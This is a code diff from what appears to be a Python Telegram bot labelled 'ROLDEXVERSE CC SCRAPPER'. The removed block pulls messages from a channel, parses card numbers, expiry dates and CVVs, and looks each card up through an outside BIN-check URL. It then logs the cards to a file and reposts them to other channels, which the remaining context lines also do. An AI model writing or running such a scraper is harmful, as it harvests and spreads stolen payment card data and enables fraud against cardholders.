@@ -100,47 +100,6 @@ with client:
              file1.close() 
              client.send_message('roldexversedrops', respo,parse_mode='html')
              client.send_message('flipzccs', respo,parse_mode='html')
-             file1 = open("TeamCrditCard.txt", "r+")    
-             file1.seek(0)  
-             ofid = file1.read()
-             ofid = int(ofid)
-             file1.close()  
-            message = client.iter_messages('TeamCrditCard',reverse=True,offset_id=ofid,min_id=ofid,wait_time=3)
-            for msg in message:
-             message = msg
-             title = msg.text
-             m = msg.id
-             file = open("TeamCrditCard.txt", 'r+')  
-             file.truncate()
-             file.write(str(m))
-             file.close()  
-             list = pregs(title)
-             cc = list[0]
-             if len(cc) == 0:
-              break
-             if len(cc) != 16:
-              break
-             con = requests.get("https://roldex.codes/bank.php?lista=" + cc).text
-             if len(con) == 0:
-              con = 'N.A'             
-             mes = list[1]
-             ano = list[2]
-             ano1 = list[2]
-             cvv = list[3]
-             if len(mes) >= 3:
-              ano = cvv
-              cvv = mes
-              mes = ano1
-             lista = cc + "|" + mes + "|" + ano + "|" + cvv
-             print(lista)
-             respo = "<b>•> ROLDEXVERSE CC SCRAPPER\n°> CARD -> <code>" + lista + "</code>\n•> BIN -> " + con +"\n•> CHANNEL -> @RoldexVerse\n•> RECHECK -> @RoldexVerseChats\n•> OWNER -> <code>@r0ld3x</code></b>"
-             # 
-             file1 = open("ccs.txt", "a")
-             m = lista + "\n"
-             file1.write(m)
-             file1.close() 
-             client.send_message('roldexversedrops', respo,parse_mode='html')
-             client.send_message('flipzcc', respo,parse_mode='html')
            except errors.FloodWaitError as e:
                print('Have to sleep', e.seconds, 'seconds')
                time.sleep(e.seconds)
